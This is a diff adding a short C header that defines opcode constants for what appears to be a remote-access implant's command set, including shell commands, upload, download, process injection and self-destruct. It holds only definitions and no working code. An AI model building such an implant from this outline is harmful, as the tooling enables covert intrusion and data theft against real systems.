@@ -1,0 +1,13 @@
+#ifndef OPCODE_H
+#define OPCODE_H
+
+#define OPCODE_CMD 0x1
+#define OPCODE_SELFDESTRUCT 0x2
+#define OPCODE_SYSINFO 0x3
+#define OPCODE_SLEEP 0x4
+#define OPCODE_UPDATE_CONFIG 0x5
+#define OPCODE_DOWNLOAD 0x6
+#define OPCODE_UPLOAD 0x7
+#define OPCODE_INJECT 0x8
+
+#endif
